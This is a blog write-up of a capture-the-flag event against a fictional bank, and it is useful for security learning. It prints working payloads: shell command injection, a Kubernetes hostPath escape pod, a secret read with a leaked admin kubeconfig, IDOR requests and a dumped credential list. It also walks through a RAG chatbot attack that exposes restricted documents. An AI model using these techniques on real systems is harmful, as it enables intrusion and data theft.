---
title: "GenCyS CTF 2.0"
description: "Shadow Clone"
icon: "article"
date: "2026-08-15"
lastmod: "2026-08-15"
draft: false
toc: true
weight: 999
---

Last year GenCyS was a lazy Sunday in Trivandrum, me solving stego with a coffee in hand. This time it was **GenCyS CTF 2.0**: same bank, bigger vault, a *lot* more infrastructure. One giant fictional org, `SecureTrust Bank`, sliced into sixteen "sectors" (OSINT, AI, Mobile, IoT, Web, Crypto, Kubernetes, AD, Cloud, Forensics, the works). Twenty-seven challenges hanging off a dozen real subdomains.

I'll be honest up front: I jumped in late, somewhere around 20th place with the clock already running. What follows is the story of clawing from mid-pack onto the podium: the chains that worked, the rabbit holes that didn't, and the boxes that were still half-solved when the organizers pulled the plug. It isn't a clean "here's the intended solution" guide. It's how it actually went.

```bash
The Setup
Recon
The Heavy Boxes
Ask Chatbot
Android App and iOS App
The Mega Jackpot
The Broken Crypto
Breaking Out of the Sandbox
The Ones That Got Away
Post Mortem
Takeaway
```

### The Setup

The scoreboard lives at `gencysctf.com`, a CTFd instance dressed up in a neon "hack the bank" skin. Every category is a "Sector," and solving one stamps a green **SECURED** tag across it. By the end I was sitting at `1950 pts`, rank `#3rd`, with Mobile, AI, Cloud, AD and Kubernetes all green.

CTFd is boringly scriptable, which is what you want when you're racing a clock:

```bash
curl -s -b cj.txt https://gencysctf.com/api/v1/challenges | jq -r \
  '.data[] | "\(.id) | \(.name) | \(.category) | \(.value) | solved=\(.solved_by_me)"'
```

```text
  6 | Phishing Investigation      | OSINT               |  50 | solved=False
  7 | Ask Chatbot                 | AI Security         | 100 | solved=False
  8 | Android App                 | Mobile Security     | 200 | solved=False
  9 | SecureTrust iOS App         | Mobile Security     | 200 | solved=False
 10 | The Broken Vault            | Reverse Engineering | 400 | solved=False
 11 | Operation Silent Ledger     | Malware Analysis    | 400 | solved=False
 12 | Operation Midnight Ledger   | Digital Forensics   | 400 | solved=False
 13 | Service Portal              | Web Application     | 250 | solved=False
 14 | Margin Call                 | Web Application     | 450 | solved=False
 15 | RFC 6585                    | Web Application     | 200 | solved=False
 16 | Nightingale                 | Network Security    | 100 | solved=False
 17 | Fix the Bank                | Secure Coding       | 100 | solved=False
 21 | Breaking Out of the Sandbox | Kubernetes Security | 500 | solved=False
 22 | The Silent Ledger           | Steganography       | 200 | solved=False
 23 | Vault Interlock             | IoT                 | 100 | solved=False
 24 | Vault                       | IoT                 | 100 | solved=False
 26 | Smart Contract              | Web3                | 200 | solved=False
 27 | The Broken Crypto           | Cryptography        | 200 | solved=False
```

Two things stood out. First, not a single challenge shipped a file through CTFd: no attachments, no connection info. Everything lived on the live `thesecuretrust.com` infrastructure and you had to go find it. Second, the organizers leaned hard into that on Discord:

{{< figure src="discord-recon.jpg" alt="GKS in the CTF Discord: reconnaissance is your primary weapon; perimeter compromise hinges on OSINT, artifact analysis, and tactical surface mapping" >}}

Someone put it more bluntly: *"basically u have to do OSINT search for challs based on the description, assume it's xyz chall from CTFd, check and scope it out."* Half the game was figuring out where a challenge even was.

One format quirk worth noting: most flags are `UST_GenCyS_CTF{...}`, but a couple of sectors use their own wrapper (The Broken Vault is `GenCyS_CTF{...}`). Read each challenge before submitting, and don't trust a flag-shaped string the app hands you for free. More on that later.

### Recon

Before touching a single exploit, map the bank. The CTFd board gives you the shape of the org:

{{< figure src="b-challenges.png" alt="the GenCyS CTF 2.0 challenge board, sixteen sectors of SecureTrust Bank" >}}

Then it's DNS. Every interesting host hangs off `thesecuretrust.com`, all behind Cloudflare:

```bash
for s in partners secops broker.hub vault.hub beacon.hub staging \
         servicedesk git.staging registry.kube1 registry.kube2 ; do
  ip=$(getent hosts "$s.thesecuretrust.com" | awk '{print $1}' | head -1)
  code=$(curl -s -m10 -o /dev/null -w "%{http_code}" "https://$s.thesecuretrust.com/")
  printf "%-32s %-22s HTTP %s\n" "$s.thesecuretrust.com" "$ip" "$code"
done
```

```text
partners.thesecuretrust.com      2606:4700:3035::ac43:9e57   HTTP 200
secops.thesecuretrust.com        2606:4700:3035::ac43:9e57   HTTP 200
broker.hub.thesecuretrust.com    2606:4700:3035::6815:...    HTTP 200
vault.hub.thesecuretrust.com     2606:4700:3035::...         HTTP 200
staging.thesecuretrust.com       104.211.231.243             HTTP 200
servicedesk.thesecuretrust.com   2606:4700:3035::ac43:9e57   HTTP 200
git.staging.thesecuretrust.com   2606:4700:3035::ac43:9e57   HTTP 403
registry.kube1.thesecuretrust.com …                          HTTP 200
registry.kube2.thesecuretrust.com …                          HTTP 200
```

And the bank's public website is where a bunch of the entry points hide in plain sight:

{{< figure src="b-bank.png" alt="The Secure Trust Bank public site, with the STB Assistant chat widget bottom-right" >}}

A quick `grep` through the homepage's HTML and Next.js chunks turns up three doors: `/api/download/apk`, `/api/download/ipa`, and a floating **Chatbot** widget. That's three whole challenges (id 7, 8, 9) reachable from one landing page if you know to look.

### The Heavy Boxes

The three heaviest boxes on the board fell first: Cloud, AD, and the ZigBee gateway. They're the backbone of the run, so they're worth walking through before the mobile and AI work.

**`id 18 · Cloud Access Request · Cloud Security · 300`** gives `UST_GenCyS_CTF{s3cUr3Tru5t_Cl0ud_V4ult_Pwn3d_b9d90026}`

An Azure supply-chain. It starts in the **ServiceDesk** tickets, which reference an internal backup blob container: `strustbkupa9ad09.blob.core.windows.net/backups/`. The container is public, but the *current* `terraform.tfstate` is scrubbed. The trick is that Azure Blob keeps **versions**, and an older version of the state file still had a storage key baked in:

```bash
curl -s -H "x-ms-version: 2021-08-06" \
  "https://strustbkupa9ad09.blob.core.windows.net/backups/terraform.tfstate?versionId=2026-08-15T08:21:50.76Z"
```

That leaked the `strustfunca9ad09` function-storage key, which led to the Function App `strust-stmtgen-a9ad09.azurewebsites.net`. Its `HttpTrigger` was an **anonymous PowerShell RCE** (`?cmd=`, and you're running commands in the cloud). From inside the function, its **Managed Identity** could read the Key Vault `strustkva9ad09`, whose `flag` / `TheVaultKey` secrets were the flag. Tickets, versioned tfstate, storage key, function RCE, MSI, Key Vault. Clean.

**`id 19 · Operation Golden Trust · AD Red Team · 500`**

The big one, a full Active Directory kill-chain against `GenCyS-AD-DC01.securetrust.local` (`52.140.63.202`, the classic `88/389/445/80/443` spread). Anonymous SMB was allowed but SAMR/LSAD were locked, so enumeration came from the DC's IIS **Employee Portal**, which served a `service-account-procedure.txt` documenting the org's service-account password pattern (`<OrgWord><Year><Symbol>`, year 2024 or the 2003 founding date). From there:

- **AS-REP roast** `svc_backup` (pre-auth disabled) and crack it,
- pivot to `svc_web`, which had **Kerberos constrained delegation** to `HTTP/DC01`,
- abuse S4U to impersonate a privileged user to that SPN, and ride it into the `IT-Vault$` machine account where the flag lived.

Textbook "misconfigured delegation equals game over," equal parts `impacket` and patience.

**`id 25 · ZigMesh · IoT · 400`** gives e.g. `UST_GenCyS_CTF{1020540471187015e0f145989d88c40f}` *(dynamic)*

My favourite bit of hardware whimsy in the event. `beacon.hub` is a **ZigBee** "ZigMesh Bank Gateway." Its device API (`POST /api/v2/send`) is unauthenticated and lets you inject raw vendor frames (`{destination, cluster, command, payload}`), and the gateway does the ZigBee crypto for you. The firmware (`rootfs.sqsh`) revealed a vendor cluster `0xFC20` with a hidden `EEPROM_DUMP` command (`0x31`) that dumps a segment containing `flag.txt`, but only while the HVAC controller `0x51AF` is in **Maintenance Mode**. So the chain is: flip maintenance on (`command 0x10`, payload `01`), then walk the EEPROM with `0x31` until the flag surfaces (it sat at offset `0x7f100`). The flag regenerates every maintenance cycle, so a small script (`get_beacon_flag.py`) pulls a fresh one on demand.

Three boxes, roughly 1200 points, cleared before the mobile and AI push even started.

### Ask Chatbot

**`id 7 · Ask Chatbot · AI Security · 100`**: *"Manipulate the chatbot into revealing a secret it should never disclose."*

That "STB Assistant" bubble on the bank site is a **RAG chatbot**: retrieval-augmented, so it answers by pulling chunks from an internal knowledge base and letting an LLM summarize them. The API is simple to poke:

```bash
curl -s https://thesecuretrust.com/api/chat \
  -H 'Content-Type: application/json' \
  -d '{"message":"hello"}'
# {"error":"Missing message or sessionId"}
```

It wants a `message` and a `sessionId`. Give it both and you get a reply, but the interesting bits are the fields around the response:

```json
{
  "type": "chat",
  "response": "I am STB-Assist, your Secure Trust Bank assistant. ...",
  "foundFragments": [],
  "accessedDocs": []
}
```

`foundFragments` and `accessedDocs`. That's the tell. This bot searches documents and reports which ones it touched. Digging into the frontend bundle (`3y0fq5med_8_p.js`) confirmed it:

```js
if (r.foundFragments) S(r.foundFragments);
if (r.flagCaptured) E(!0);
...
r.foundFragments && r.foundFragments.length === 3 && B(
  "You have collected all 3 security tokens from the knowledge base. " +
  "Examine the documents and assemble them in the order they were discovered. " +
  "Submit your answer with: flag [your_assembled_flag]"
);
```

So it isn't a "jailbreak the system prompt" puzzle at all. It's broken access control in a RAG pipeline. Three flag-fragment "security tokens" are scattered across classified documents. Normal chit-chat never surfaces them, and the bot deflects meta questions with a fake *"I'm handling a high volume of requests"* brush-off. The knowledge base spells out the bug itself, in document `INT-001`:

> *"The search interface bypasses document-level classification filtering. This is a known issue scheduled for remediation in v2.4."*

That's the vulnerability. Classification is enforced **after** retrieval, not before, so if you can make the search run, it returns `[RESTRICTED]` and `[CLASSIFIED]` documents verbatim. And the words that flip it from "chat" mode into raw "search" mode are literally **`search knowledge base for ...`**. Two searches surfaced all three tokens (keeping one stable `sessionId` so the server accumulates them):

```bash
curl -s https://thesecuretrust.com/api/chat -H 'Content-Type: application/json' -d '{
  "message":"search knowledge base for onboarding and staff documents",
  "sessionId":"run-1"}'
```

```json
{"type":"search_results",
 "documents":[
   "[INTERNAL] INT-001 | STB-RAG Architecture Overview v2.3 ... Security Audit Token: UST_GenCyS_CTF{R4G_",
   "[RESTRICTED] SEC-001 | SECURITY INCIDENT: SOC-2025-0847 ... System memory reference token: M3m0ry_"],
 "warnings":["WARNING: Accessing RESTRICTED document. This access has been logged by SOC."],
 "foundFragments":["UST_GenCyS_CTF{R4G_","M3m0ry_"],
 "accessedDocs":["INT-001","PUB-001","SEC-001"]}
```

The third hid behind a more targeted query about model-extraction and vault tokens, which pulled in the `[CLASSIFIED]` `CLS-001` doc labelled *"INTEGRITY TOKEN (DO NOT EXPOSE)"*, which carried the fragment `L34k}`. Three fragments, in discovery order:

```text
UST_GenCyS_CTF{R4G_   +   M3m0ry_   +   L34k}
```

Assemble, submit back through the bot's own validation, and it lights up:

```json
{"type":"flag","flagCaptured":true,
 "response":"FLAG CAPTURED: UST_GenCyS_CTF{R4G_M3m0ry_L34k}"}
```

`UST_GenCyS_CTF{R4G_M3m0ry_L34k}`. First flag of the run, and a fitting name: the theme is literally a RAG memory leak. The takeaway is small but real: if a RAG system checks document permissions after the retriever has already fetched the text, that isn't access control, it's a suggestion. Filter at the index layer, before the model ever sees a restricted chunk. (The one gotcha was a 45-second-per-query rate limit tied to my source IP; rotating `sessionId` or `X-Forwarded-For` did nothing, so this one just rewarded patience.)

{{< figure src="b-chatbot.png" alt="STB Assistant, the RAG chatbot behind id 7" >}}

### Android App and iOS App

**`id 8 · Android App`** and **`id 9 · SecureTrust iOS App`**, 200 each. These were my favourite chain of the event.

#### Getting the binaries

The bank site links to `/api/download/apk` and `/api/download/ipa`, but both throw a `403`:

```bash
curl -sI https://thesecuretrust.com/api/download/apk
```

"Android Device Required." The download is **User-Agent gated**: the onClick handler in the JS sniffs `navigator.userAgent` for `/android/i` before it lets you through. Spoof it and the server hands you a `302` redirect to the real artifact in Azure blob storage:

```bash
curl -sI -A "Mozilla/5.0 (Linux; Android 13; Pixel 7)" \
     https://thesecuretrust.com/api/download/apk | grep -i location
# location: https://securetrustmobileapps.blob.core.windows.net/mobile-apps/SecureTrust-QA.apk
```

Same trick with an iPhone UA gets `SecureTrustMobile.ipa`. Two ~57 MB banking apps in hand.

#### The Android app, a hall of mirrors

Unzipping the APK reveals an `assets/` folder that is aggressively baited:

```text
assets/config.enc              <- encrypted, interesting
assets/local.db                <- "local storage" (the challenge's words)
assets/old-qa-keystore         <- literally "DECOY-OLD-QA-KEYSTORE-DO-NOT-USE"
assets/fake-stripe.txt         assets/fake-jwt.txt
assets/fake-aws.json           assets/fake-admin.txt
assets/fake-firebase-token.txt assets/developer_notes.txt
```

Every `fake-*` file is a rabbit hole, and even `BuildConfig` is stuffed with decoy `ADMIN_PASSWORD` / `AWS_SECRET_KEY` values ending in `DECOY`. The description says *"recover a hidden flag from its local storage,"* which points at `config.enc`, and decompiling the DEX with `jadx` shows how it's opened:

```java
// BuildConfig.java
QA_CONFIG_KEY = "90ff58e849a16c8ab121cf76be4e4472"
QA_CONFIG_IV  = "63f2ce766224cb2915be03efac744504"
// CryptoBox.decryptAsset(): AES/CBC/PKCS5Padding, hexToBytes(key), hexToBytes(iv)
```

AES-128-CBC with the key and IV sitting right there in the build config. Decrypt it:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
key = bytes.fromhex("90ff58e849a16c8ab121cf76be4e4472")
iv  = bytes.fromhex("63f2ce766224cb2915be03efac744504")
ct  = open("assets/config.enc","rb").read()
print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16).decode())
```

```json
{"qa_token":"qa-8764f96756740c4bd179581d2e324357",
 "api_base":"https://mobile.api.thesecuretrust.com",
 "endpoints":["/mobile/profile","/mobile/version","/mobile/challenge"]}
```

A QA token and a hidden API. Present the token and hit the "challenge" endpoint:

```bash
curl -s -H "X-QA-Token: qa-8764f96756740c4bd179581d2e324357" \
     https://mobile.api.thesecuretrust.com/mobile/challenge
# {"flag":"GenCyS_PROOF{mobile-forgotten-7aeb1c3c01fd8da2108c8f06}"}
```

A flag. Except the CTFd grader spat it right back out as **Incorrect**. That's the trap: `GenCyS_PROOF{...}` is not the flag, it's a **proof token**, shaped like a flag to make you submit it and move on. The real submission needed one more hop, which I found by fuzzing sibling endpoints until one returned `400` instead of `404`:

```bash
curl -s https://mobile.api.thesecuretrust.com/mobile/claim \
  -H "X-QA-Token: qa-8764f96756740c4bd179581d2e324357" \
  -H "X-Proof-Token: GenCyS_PROOF{mobile-forgotten-7aeb1c3c01fd8da2108c8f06}"
# {"flag":"UST_GenCyS_CTF{0416ba6d4d3f34cececabacb87d8870450b50b82af7491d83fa975148d7cdf72}"}
```

`/mobile/claim` swaps the proof for the real thing (and it insists on the full wrapped `GenCyS_PROOF{...}` string; inner-only gets rejected). id 8 down.

#### The iOS app, an IDOR up a ladder

The IPA plays the same "hardcoded secret" tune but runs deeper. The Mach-O binary and the accidentally-shipped `_DebugSources/AppConfig.swift` leak another AES-128 key/IV, which decrypts its `config.enc` into a completely different API surface:

```json
{"api_base":"https://mobile.api.thesecuretrust.com",
 "support_user":"support_qa",
 "endpoints":["/api/v1/auth/login","/api/v1/profile",
              "/api/v1/accounts/{account_id}",
              "/api/v1/transactions/{transaction_id}",
              "/api/v1/beneficiaries/{beneficiary_id}"]}
```

Everything on `/api/v1/*` is locked behind a `Bearer` token, and the token comes from `POST /api/v1/auth/login` using HTTP Basic as `support_qa:<password>`. The developer notes say the password is *"same as the current sprint number, rotated per sprint."* Except the apps are littered with sprint numbers: Android's `BuildConfig.SPRINT` says **70**, an internal email says **Sprint 37**, the build number is `2026.07.37`. All decoys. The real value was in a **world-readable rewards bucket** the iOS `RewardsSync.swift` pointed at, whose `release_notes.pdf` said the current sprint was **17**. The password was the literal string `Sprint-17`.

From there it's a clean privilege ladder. Log in as `support_qa` for a Bearer token, then, because that support role was never meant to read the internal ledger, **IDOR** the internal transaction `TX-INT-9001`, which leaks the custodian's `internal_auth_token` (`9ca51a20…`). Present that token to the custodian-only audit endpoint and the flag is minted:

```bash
TOK=$(curl -s -u 'support_qa:Sprint-17' -X POST \
      https://mobile.api.thesecuretrust.com/api/v1/auth/login | jq -r .accessToken)

curl -s -H "Authorization: Bearer $TOK" \
     https://mobile.api.thesecuretrust.com/api/v1/transactions/TX-INT-9001

curl -s https://mobile.api.thesecuretrust.com/api/v1/securetrust/internal/audit \
     -H "X-Internal-Auth: 9ca51a20c4a353771af7caea2987490a989a7710c0d17354" \
     -H "X-CTFd-User: user"
# {"flag":"UST_GenCyS_CTF{8716a1d2dd1fd8ca5ffafe184c1db3f2b11cde41bd1d9687607eebe418736160}"}
```

Both submitted, both `correct`, +400 points, and the scoreboard jumped me from 24th to **2nd**. The real point of both apps was decoy discipline: `fake-*` files, the `GenCyS_PROOF{}` fake-out, three different fake sprint numbers, decoy DB rows, dead Firebase keys. A mobile app is just a client, so every secret in it is already yours; the interesting bug is never the hardcoded key, it's what the key unlocks. Read everything, believe nothing the app hands you for free.

### The Mega Jackpot

Around 6:54 PM, barely an hour before close, the organizers dropped what they called *"The Mega Jackpot"* on Discord:

{{< figure src="discord-jackpot.jpg" alt="GKS in the CTF Discord: The Mega Jackpot - Credentials, pointing at the exposed /backup on servicedesk with reused creds for git.staging and secops" >}}

One `curl` and you're staring at a wall of harvested creds:

```bash
curl -s https://servicedesk.thesecuretrust.com/backup
```

```text
Email,Password
pbeesly2@st-internal.com,f0JTI5kRH@JJ
kskapoor50@st-corp.net,HK2ckHzTNuxAQ
ckent25@securetrust.local,Z!p67nqAfeR!
tstark35@securetrust.local,t0SzPTCvjECl
srogers6@thesecuretrust.com,kvU3j%Pv2Bd%$y
...  (~50 reused credentials)
```

The intended use was credential-stuffing these into `secops` (the SOC dashboard, i.e. the *Operation Silent Ledger* malware chain), `git.staging` (the GitLab, i.e. the stego image and source), and `servicedesk` itself. A skeleton key for at least three unsolved challenges. The problem: it landed with 66 minutes on the clock, and every one of those was a multi-step chain behind it.

### The Broken Crypto

**`id 27 · The Broken Crypto · Cryptography · 200`**: *"Break the flawed cryptographic scheme protecting the vault."*

{{< figure src="b-staging.png" alt="staging.thesecuretrust.com, the internal staging environment that leaked its .git" >}}

No file in CTFd, no obvious host. But Discord had been whispering:

> The staging service may reveal useful clues when you enumerate its exposed resources and associated IPs. Pay close attention to **development-related resources**.

"Development-related resources" on a staging box is a loud hint for one thing:

```bash
curl -s https://staging.thesecuretrust.com/.git/HEAD
# ref: refs/heads/master
```

An exposed `.git` directory. Directory listing was off, but the commit log gives the game away:

```bash
curl -s https://staging.thesecuretrust.com/.git/logs/HEAD
# 000000.. 560e0c7d.. Admin  commit (initial): Initial commit of crypto challenge
```

*"Initial commit of crypto challenge."* With the commit hash you don't need a listing at all; you walk the object tree by hash, inflate each `zlib` blob, and reconstruct the repo. Out popped `SecureTrust_Crypto_Evidence.zip`, ten artifacts of a bespoke `ST-TSP/1.3` "transaction security protocol": signed transaction bundles, an encrypted settlement message, an archive, a key-exchange transcript, an RSA cert, a JWT capture. An incident report inside warns you not to trust every object; plenty are deliberate red herrings.

The real flaw hides in the binary layout. Every `STTX` record carries a key-id and a nonce, and if you line up the settlement (`type 0x02`) and archive (`type 0x04`) messages:

```text
STTX 13 02 .. key_id=1bd0473e1ccc1986  nonce=f650ba2dff5fae6c0ddbd18f  <ct...>
STTX 13 04 .. key_id=1bd0473e1ccc1986  nonce=f650ba2dff5fae6c0ddbd18f  <ct...>
```

**Same key, same nonce.** That's AES-GCM nonce reuse, a two-time pad, where `C1 XOR C2 = P1 XOR P2` and the keystream cancels out, so known-plaintext crib-dragging peels both messages open. And that's only the appetiser: `transaction_bundle.bin` carries two ECDSA signatures from the same `server_pub`, and if they reused the signing nonce `k`, you recover the server's private key, run the ECDH, derive the HKDF session keys, and decrypt the actual vault backup fragment.

I had it dumped, structured, and half-broken in a scratch dir, and then time ran out mid-crib-drag. Painful, because the hard part (finding it, dumping it, spotting the reuse) was already done. The lesson pays for itself anyway: a `.git` on a web root is whole-repository disclosure, and reusing a GCM nonce downgrades authenticated encryption to XOR with extra steps.

### Breaking Out of the Sandbox

This is the one I'm proudest of, even though it landed after the buzzer. **`id 21 · Breaking Out of the Sandbox · Kubernetes · 500`**, the single biggest challenge on the board.

There are two `registry.kube*` hosts, a matched pair, two roads to the same "escape the pod, become the node" destination.

**`id 20 · Misconfigured Microservices · Kubernetes · 250`** is the gentler of the two: that challenge straight-up **hands you a kubeconfig** (a service account whose RBAC was scoped far too generously). Once you can talk to the API server you don't attack the cluster software at all; you just ask it to schedule a pod that mounts the node's root filesystem, and let Kubernetes do the breakout for you:

```yaml
# the classic hostPath escape pod, kubectl apply -f this
apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep","infinity"]
    volumeMounts: [{ name: host, mountPath: /host }]   # node's / mounted in
  volumes:
  - name: host
    hostPath: { path: / }
```

`kubectl exec` into that, and `/host` is the node's entire disk; read its kubeconfig, become cluster-admin, read the flag. That's kube1. Its sibling, `registry.kube2`, looked like it had a command-injection bug worth confirming.

`registry.kube2` isn't a container registry at all; it's a Next.js app calling itself the **SecureTrust Analytics API**. And look what it advertises on the overview: an *Analytics Gateway*, *Core Banking*, and a *Cluster Node*.

{{< figure src="b-kube2.png" alt="registry.kube2, the SecureTrust Analytics API, foreshadowing the cluster node" >}}

The API reference documents one endpoint: `GET /api/report`, which *"generates a live metrics report by interacting directly with the underlying reporting engine CLI."* "Interacting with a CLI" is web-app for "it shells out to a command." Find the query parameter and it tells on itself:

```bash
curl -s 'https://registry.kube2.thesecuretrust.com/api/report?query=127.0.0.1'
```

```json
{"command":"analytics-report --format json --filter '127.0.0.1'",
 "query":"127.0.0.1","returncode":127,
 "stderr":"/bin/sh: 1: analytics-report: not found\n","stdout":""}
```

It echoes the exact shell command it built: `analytics-report --format json --filter '<query>'`, run through `/bin/sh`. The input lands inside single quotes, so break out of them, run whatever, and the reflected `stdout` hands back the output:

```bash
curl -s -G 'https://registry.kube2.thesecuretrust.com/api/report' \
  --data-urlencode "query='; id; hostname; uname -a; echo '"
```

```json
{"command":"analytics-report --format json --filter ''; id; hostname; uname -a; echo ''",
 "returncode":0,
 "stdout":"uid=0(root) gid=0(root) groups=0(root)\nanalytics-api-7bbb9bf6b5-q59ml\nLinux analytics-api-7bbb9bf6b5-q59ml 6.17.0-1022-azure ... x86_64 GNU/Linux\n"}
```

Root, inside a pod. Command injection confirmed. But id 21 isn't "get RCE in a pod," it's *"break out of the restricted sandbox to reach the cluster node."* So what's mounted?

```bash
curl -s -G 'https://registry.kube2.thesecuretrust.com/api/report' \
  --data-urlencode "query='; ls -la /; echo '"
```

```text
drwxr-xr-x  22 root root 4096 host          <- the node's filesystem, mounted in
drwxr-xr-x   1 app  app  4096 app
...
```

There it is: **`/host`**, the node's entire root filesystem mounted into the pod. That's the sandbox escape, a misconfigured `hostPath` volume, the mirror image of the kube1 pod trick. Rummaging around `/host` turns up two crown jewels:

```text
/host/opt/gencys-k8s/rotate-flag.sh          <- how the flag is placed
/host/etc/rancher/k3s/k3s.yaml               <- the node's cluster-admin kubeconfig
/host/var/log/containers/flag-service-*.log  <- a "flag-service" pod exists
```

`rotate-flag.sh` is basically the answer key, an AD-style rotating flag stored in a Kubernetes Secret:

```bash
NS="securetrust-corebanking"; SECRET="core-banking-flag-key"
FLAG="UST_GenCyS_CTF{$(openssl rand -hex 32)}"
kubectl -n "$NS" patch secret "$SECRET" --type merge \
  -p "{\"stringData\":{\"CURRENT_FLAG\":\"$FLAG\"}}"
```

And `k3s.yaml` is a full **cluster-admin** kubeconfig with the client certs embedded in it. This being k3s, its server points at `127.0.0.1:6443` (useless from inside a pod), but the embedded admin cert is valid cluster-wide, so I retarget `kubectl` at the in-cluster API service (`10.43.0.1:443` from the pod's env) and read the secret directly:

```bash
curl -s -G 'https://registry.kube2.thesecuretrust.com/api/report' --data-urlencode \
"query='; kubectl --kubeconfig=/host/etc/rancher/k3s/k3s.yaml \
  --server=https://10.43.0.1:443 --insecure-skip-tls-verify \
  -n securetrust-corebanking get secret core-banking-flag-key \
  -o jsonpath={.data.CURRENT_FLAG} | base64 -d; echo '"
```

```text
UST_GenCyS_CTF{5c7fea76e6b2949eefa9f24d108c8393dfc2f54244ea3cddb0eb2b6c8df0ee63}
```

Command injection, root pod, host mount, cluster-admin, secret. The full 500-point breakout, start to finish. The catch: by the time I pasted it into the submit box, CTFd answered with `{"message":"GenCyS CTF 2.0 has ended"}`. The flag rotates every run, so it was only ever good live, but the chain is real and reproducible. I'll take the solve without the points.

Two separate misconfigurations here, either one fatal: a web app concatenating user input into a shell string, and a pod running as root with the node's filesystem `hostPath`-mounted. In a real cluster, `/host` plus a node's `k3s.yaml` is total compromise.

### The Ones That Got Away

Plenty of challenges I scoped, poked, understood, and simply ran out of clock on. Here's the graveyard, with what I know for the next person:

- **`id 23 · Vault Interlock`** and **`id 24 · Vault`** *(IoT, 100 each).* `broker.hub` is a NETIO AN32 Modbus/TCP gateway with ON/OFF/SHORT/TOGGLE controls; `vault.hub` is a Wirepas MQTT console. I burned real hours here before realising both are **static Next.js decoys**: I reversed the page chunk and every button just calls `setAll(1)`/`setAll(0)` on local React state, with no fetch, no server action, no API. Some ~2000 endpoint/method/body probes all returned the identical 14 KB SPA shell. The Discord hint was the tell in hindsight, *"follow the trail from the gateway into the messaging layer"*: the real interlock/vault logic lives on a raw **Modbus/TCP (`:502`)** or **MQTT (`:1883`)** endpoint that Cloudflare never proxies. Without an out-of-band `host:port` for that messaging layer (CTFd gave no connection info), the dashboard is a dead end by design. The move is a `pymodbus` write-multiple-coils that forces two mutually-exclusive outputs high at once, but you need the socket first.

{{< figure src="b-broker.png" alt="broker.hub, the NETIO AN32 interlock gateway (id 23), a static decoy" >}}

{{< figure src="b-vault.png" alt="vault.hub, the Wirepas MQTT vault console (id 24)" >}}

- **`id 13 · Service Portal`** *(SSRF, 250).* *"A feature ... can be persuaded to fetch more than it should."* A textbook SSRF: find the server-side URL fetcher (a portal that pulls an external resource) and point it at an internal service or cloud metadata endpoint.
- **`id 22 · The Silent Ledger`** *(Stego, 200).* *"An image from SecureTrust's internal version control portal."* That's `git.staging` (GitLab, `403` to the public); the Mega Jackpot creds were the intended key in, then it's LSB / `zsteg` / `steghide` on whatever image lives in a repo.
- **`id 11 · Operation Silent Ledger`** *(Malware, 400).* A ledger implant whose telemetry surfaces in the `secops` SOC dashboard. I'd already decrypted its AES-256-CBC exfil offline (PBKDF2 key from a memory dump), but the obvious `ledger_token` in it is a **decoy**; the real flag needed the SOC console, which needed the Mega Jackpot creds, which needed more than an hour.
- **`id 12 · Operation Midnight Ledger`** *(Forensics, 400).* A full DFIR kit: `$MFT`, `$UsnJrnl`, EVTX, prefetch, registry, a phishing `.eml` with a macro-laden `.xlsm`, a password-protected 7-zip. I cracked the archive (`MidnightLedger$222d924e08cf`) and pulled the manifest, but the intended flag was a timeline-reconstruction artifact I never pinned.
- **`id 10 · The Broken Vault`** *(RE, 400).* This one I reversed hard and still didn't crack, the honest kind of loss. Both PE64 binaries are built around the same **custom 22-opcode bytecode VM** (dispatch table at `0x14000a020`, self-decrypting bytecode via an SMC opcode running `key = key*5+1`). I reimplemented the whole VM in Python and differential-tested it against `docker-wine` until it matched byte-for-byte: `vault_ecm.exe` deterministically emits a 32-byte seed (`fb520a42…640102`), and `vault_lock.exe` is a pure ARX-based KDF. That gave me the real decrypt key, `lock(cached_ecm_code d140e205…) = c2ed9a863781eb91f901e858965ca9f5`. The wall: `sealed_deposit.enc` was sealed by a third program, `vault_guard_svc.exe`, whose encryption routine uses round-function opcodes (SBOX, FNV, a MADD/MIX schedule) that appear in none of the shipped binaries, and the `VAULTDMP` memory dump is heap-only, with no code and no keystream remnant. So I could rebuild the key but never the guard's exact keystream; ~1500 cipher constructions (AES all modes, ChaCha/Salsa, RC4, TEA/XTEA/XXTEA, every OFB/CTR/CFB reading of the KDF) all came up empty. The missing program was the whole point.
- **`id 15 · RFC 6585`** *(Web, 200).* RFC 6585 is the "additional HTTP status codes" spec (`428/429/431/511`). *"Abuse the status-code handling flaw to bypass access control"* points at an auth proxy that **fails open** when the backend returns `429 Too Many Requests` (the `secops` login already trusts `X-Forwarded-For` for its rate limiter).
- **`id 16 · Nightingale`** *(Network, 100).* *"Decode the exfiltration channel,"* tied again to what staging left exposed; a covert channel (DNS / ICMP / SNI) waiting to be reassembled and decoded.
- **`id 6 · Phishing Investigation`** *(OSINT, 50)*, **`id 17 · Fix the Bank`** *(Secure Coding, 100)*, **`id 26 · Smart Contract`** *(Web3, 200).* Scoped but never started. Phishing wanted OSINT on the campaign, Fix-the-Bank wanted a source audit and patch submission, and Web3 needed a contract address/RPC that only ever lived in Discord.

That's a lot left on the table, but I can now name the vuln class for every one of them, which is most of the battle.

### Takeaway

The honest meta-story: I got in late and made up ground by going wide. Rather than grind one challenge at a time, I fanned out, scoping every subdomain in parallel and running the offline-heavy boxes in the background while I hand-drove the live web ones. The Mobile and AI chains carried the score; the K8s breakout was the encore the clock stole.

The numbers: opened around 20th, peaked at 2nd right after the mobile double, settled at a final 3rd / 1950. Three fresh flags this session (id 7, 8, 9), one full 500-point chain solved a hair too late (id 21), and a crypto box dumped and half-broken (id 27).

What I'd do differently: watch the Discord announcement channel from minute one. Half the "impossible" challenges (`/backup`, the `.git` leak, the K8s hints) were gifted in `#announcements`, and the ones I solved fastest were the ones where I read the hint first and reversed second. Recon really was the primary weapon; the organizers said so in the first message and they meant it.

Find where a challenge lives, name the vulnerability, then break it. The rest is time.

## Finals

The finals ran the same way the quals did: no files and no connection info through CTFd, just a name under `*.thesecuretrust.com` for each challenge and the job of figuring out where it actually lived. What made them a different beast was the scale. This time the whole board hung together as one fictional healthcare group, HealthShield, spread across a single interconnected estate that plays as one long red team assessment. You start with recon and OSINT to map the perimeter, find a way in, then move laterally across an AD estate, a Kubernetes cluster, a boot2root, some IoT gear, a couple of mobile apps, and a stack of web and API services, picking up flags on the way to Domain Admin and cluster-admin.

